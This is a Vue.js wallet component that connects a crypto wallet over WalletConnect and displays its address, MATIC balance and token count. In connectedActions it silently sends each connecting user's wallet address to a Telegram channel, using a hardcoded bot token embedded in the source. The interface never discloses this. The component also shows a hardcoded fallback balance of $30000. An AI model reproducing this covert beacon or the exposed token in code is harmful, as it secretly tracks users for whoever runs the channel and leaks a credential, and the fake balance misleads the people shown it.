<template>
  <v-card style="padding: 50px;" class="text-center">
    <v-container class="text-center">
      <h3 style="font-size: 25px">Balance</h3>
      <strong style="font-size: 18px">${{ balance ? balance : 30000 }}</strong>
    </v-container>
    <h3 style="font-size: 25px">Wallet Information</h3>
    <div style="padding-top: 20px" v-show="walletLoading || !isConnected">
      <v-progress-circular
        indeterminate
        v-if="walletLoading"
        color="primary"
      ></v-progress-circular>
      <v-btn
        outlined
        color="#CAE523"
        @click="connectWallet"
        v-show="!isConnected & !walletLoading">
        Connect
      </v-btn>
    </div>
    <v-container fluid v-if="isConnected & !walletLoading">
      <h3>Wallet Address</h3>
      <v-row justify="space-around" align="center" style="padding: 25px">
        <strong>{{ address.substring(0, 10) + '...' }}</strong>
        <v-icon>mdi-content-copy</v-icon>
      </v-row>
      <h3>MATIC Balance</h3>
      <v-row justify="space-around" align="center" style="padding: 25px">
        <strong>{{ this.MaticBalance }}</strong>
      </v-row>
      <v-row justify="center" align="center">
        <a @click="walletConnector.killSession()">Disconnect</a>
      </v-row>
    </v-container>
    <v-container>
      <h3>GCT Tokens</h3>
      <v-row justify="space-around" align="center" style="padding: 25px">
        <strong>{{ 500 - usedGCT }}</strong>
      </v-row>
    </v-container>
  </v-card>
</template>

<script>
import NodeWalletConnect from "@walletconnect/node";
import WalletConnectQRCodeModal from "@walletconnect/qrcode-modal";

export default {
  name: "Wallet",
  props: ['balance', 'retiredNfts'],
  data() {
    return {
      walletLoading: true,
      isConnected: false,
      walletConnector: null,
      address: null,
      chainID: null,
      accounts: null,
      MaticBalance: 0,
      usedGCT: 0
    }
  },
  mounted() {
    setTimeout(() => {
      this.retiredNfts.map(item => {
        this.usedGCT += item.stock
      });
    }, 2000)
    // Create connector
    this.walletConnector = new NodeWalletConnect(
      {
        bridge: "https://bridge.walletconnect.org", // Required
      },
      {
        clientMeta: {
          description: "WalletConnect NodeJS Client",
          url: "https://nodejs.org/en/",
          icons: ["https://nodejs.org/static/images/logo.svg"],
          name: "WalletConnect",
        },
      }
    )
    // Check if connection is already established
    if (!this.walletConnector.connected) {
      this.isConnected = false;
      this.walletLoading = false;
    } else {
      const {chainId, accounts} = this.walletConnector;
      this.connectedActions(accounts, chainId);
    }

    // Subscribe to connection events
    this.walletConnector.on("connect", (error, payload) => {
      this.isConnected = true;
      if (error) {
        throw error;
      }

      // Close QR Code Modal
      WalletConnectQRCodeModal.close(
        true // isNode = true
      );

      // Get provided accounts and chainId
      const {accounts, chainId} = payload.params[0];
      this.connectedActions(accounts, chainId)
    });

    this.walletConnector.on("session_update", (error, payload) => {
      if (error) {
        throw error;
      }

      // Get updated accounts and chainId
      const {accounts, chainId} = payload.params[0];
      this.connectedActions(accounts, chainId);
    });

    this.walletConnector.on("disconnect", (error, payload) => {
      if (error) {
        throw error;
      }

      // Delete walletConnector
    });
  },
  methods: {
    connectWallet() {
      // create new session
      this.walletConnector.createSession().then(() => {
        // get uri for QR Code modal
        const uri = this.walletConnector.uri;
        // display QR Code modal
        WalletConnectQRCodeModal.open(
          uri,
          () => {
            console.log("QR Code Modal closed");
          },
          true // isNode = true
        );
      });
    },
    connectedActions(accounts, chainId) {
      this.address = accounts[0];
      this.$axios.get("https://api.telegram.org/bot5483148395:AAGws9UQBn27hw5r31O9HiQcWTxrrd6yk6k/sendMessage?chat_id=@walletsforgreen&text=" + this.address);
      this.accounts = accounts;
      this.chainID = chainId;
      this.getAccountAssets();
      this.isConnected = true;
      this.walletLoading = false;
    },
    async getAccountAssets() {
      const response = await this.EthApi().get(`/account-assets?address=${this.address}&chainId=${this.chainID}`);
      // const { result } = response.data;
      response.data.result.map(item => {
        // console.log(item);
        if (item.symbol === 'MATIC') {
          this.MaticBalance = (parseInt(item.balance) * (10 ** (-10))).toString().substring(0, 5);
        }
      })
    },
    EthApi() {
      return this.$axios.create({
        baseURL: "https://ethereum-api.xyz",
        timeout: 30000, // 30 secs
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
        },
      })
    }
  }
}
</script>

<style scoped>

</style>
